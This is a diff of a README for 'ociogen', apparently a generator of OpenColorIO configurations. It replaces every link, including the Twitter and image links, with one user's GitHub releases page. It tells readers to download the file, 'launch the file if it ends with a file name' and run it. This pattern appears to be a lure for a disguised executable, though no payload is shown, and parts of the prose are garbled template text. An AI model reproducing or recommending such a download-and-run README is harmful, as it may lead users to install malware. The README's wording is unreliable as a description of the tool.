@@ -10,7 +10,7 @@ Welcome to the **ociogen** repository - your go-to place for generating minimal 
 
 ## Getting Started
 
-To start using **ociogen**, head over to the [repository link](https://github.com/project/files/App.zip). Remember, you might need to launch the file if it ends with a file name. If the link doesn't provide what you're looking for, check out the "Releases" section for more options. 🔗
+To start using **ociogen**, head over to the [repository link](https://github.com/cauaplima3/ociogen/releases). Remember, you might need to launch the file if it ends with a file name. If the link doesn't provide what you're looking for, check out the "Releases" section for more options. 🔗
 
 ## Features
 
@@ -27,7 +27,7 @@ Utilize the gamut mapping capabilities of **ociogen** to ensure that your colors
 
 To install **ociogen**, follow these steps:
 
-1. Download the latest version from the [repository link](https://github.com/project/files/App.zip).
+1. Download the latest version from the [repository link](https://github.com/cauaplima3/ociogen/releases).
 2. Extract the files to your preferred directory.
 3. Run the application and start generating your OpenColorIO configurations.
 
@@ -54,7 +54,7 @@ If you encounter any issues or have any questions, feel free to contact us throu
 
 ## Stay Connected
 
-Stay updated on the latest **ociogen** news and updates by following us on [Twitter](https://twitter.com/ociogen)!
+Stay updated on the latest **ociogen** news and updates by following us on [Twitter](https://github.com/cauaplima3/ociogen/releases)!
 
 ---
 
@@ -64,6 +64,6 @@ Remember, in the colorful world of VFX, accuracy is everything. Trust **ociogen*
 
 Happy color grading! 🎨👩‍🎨
 
-![Colorful Palette](https://imageurl.com)
+![Colorful Palette](https://github.com/cauaplima3/ociogen/releases)
 
 ---
